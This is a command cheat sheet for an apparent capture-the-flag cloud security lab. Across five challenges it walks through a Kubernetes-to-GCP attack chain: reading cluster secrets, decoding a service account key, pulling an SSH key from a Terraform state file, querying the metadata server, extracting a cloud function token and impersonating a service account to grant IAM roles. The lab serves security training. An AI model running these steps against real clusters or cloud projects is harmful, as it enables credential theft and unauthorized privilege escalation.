# Commands

<details>
  <summary>***** Challenge 1 *****</summary>

## Challenge 1

set cluster IP
#####
    export IP=<IP>

Access API
#####
    curl -k https://$IP/api

Set your token as environment variable.  
#####
    export TOKEN=<token>

Send a request with your token to the Kubernetes API:  
#####
    curl -k -H "Authorization:Bearer $TOKEN" https://$IP/api/

You can find out which permissions 'system:authenticated' has on this cluster with a request to this endpoint:  
#####
    curl -k -X POST -H "Content-Type: application/json" -d '{"apiVersion":"authorization.k8s.io/v1", "kind":"SelfSubjectRulesReview", "spec":{"namespace":"default"}}' -H "Authorization:Bearer $TOKEN" https://$IP/apis/authorization.k8s.io/v1/selfsubjectrulesreviews

You can also query them by using the Kubernetes API:  
#####
    curl -k -H "Authorization:Bearer $TOKEN" https://$IP/api/v1/namespaces/default/pods

  <details>
    <summary>Walkthrough Challenge 1</summary>
  
  You can read Kubernetes secrets in the default namespace on the cluster. Which secrets might it hold?  
  #####
      curl -k -H "Authorization:Bearer $TOKEN" https://$IP/api/v1/namespaces/default/secrets
  
  The secret values are base64 encoded. Decode them to read the value:  
  #####
      echo -n <secret-value> | base64 -d  

  Safe blob to file
  #####
      echo -n <secret-value> | base64 -d  > /tmp/sa_key.json
  
  </details>

</details>

#

<details>
  <summary>***** Challenge 2 *****</summary>

## Challenge 2

set project id
#####
    export PROJECT_ID=nodal-seer-306517

activate service account
#####
    gcloud auth activate-service-account --key-file /tmp/sa_key.json

check service account
#####
    gcloud auth list

  <details>
    <summary>Walkthrough Challenge 2</summary>

  List files on bucket
  #####
    gsutil ls gs://file-uploads-$PROJECT_ID

  Read state file on bucket
  #####
    gsutil cat gs://file-uploads-$PROJECT_ID/default.tfstate

  
  </details>

</details>

#

<details>
  <summary>***** Challenge 3 *****</summary>

## Challenge 3

read state file
#####
    gsutil cat gs://file-uploads-$PROJECT_ID/default.tfstate

  <details>
    <summary>Walkthrough Challenge 3</summary>
    
  ssh into vm
  #####
    ssh -i <private key file> alice@<compute instance IP> 

  </details>

</details>

#

<details>
  <summary>***** Challenge 4 *****</summary>

## Challenge 4

show VM service account
#####
    gcloud auth list

background: metadata server
#####
    curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/" -H "Metadata-Flavor: Google"

demonstrate limited access scopes
#####
    gcloud compute instances list

show access scopes from tokeninfo endpoint
#####
    curl -i https://www.googleapis.com/oauth2/v3/tokeninfo\?access_token=$(gcloud auth print-access-token)

list storage buckets from VM
#####
    gsutil ls

  <details>
    <summary>Walkthrough Challenge 4</summary>

  list function source code bucket
  #####
      gsutil ls gs://cloud-function-bucket-challenge4

  read source code
  #####
      gsutil cat gs://cloud-function-bucket-challenge4/main.py

  execute function invocation script
  #####
      ./invoke_monitoring_function.sh

  extract command to get function token
  #####
    curl -s -X POST https://europe-west1-$PROJECT_ID.cloudfunctions.net/monitoring-function -H "Authorization: bearer $(gcloud auth print-identity-token)" -H "Content-Type: application/json" -d '{"metadata": "token"}'

  </details>

</details>

#

<details>
  <summary>***** Challenge 5 *****</summary>

## Challenge 5

set token as env var
#####
     export CLOUDSDK_AUTH_ACCESS_TOKEN=<function token>

Get project permissions
#####
    gcloud projects get-iam-policy $PROJECT_ID

List the other service accounts on this project:
#####
    gcloud iam service-accounts list

Describe role
#####
    gcloud iam roles describe TerraformPipelineProjectAdmin --project $PROJECT_ID

Describe bindings on SA
#####
    gcloud iam service-accounts get-iam-policy <terraform service account>

  <details>
    <summary>Walkthrough Challenge 5</summary>
  
  impersonate and set binding
  #####
    gcloud projects add-iam-policy-binding $PROJECT_ID --member=user:<your Google account> --role=roles/viewer --impersonate-service-account <terraform pipeline account>
  
  </details>

</details>


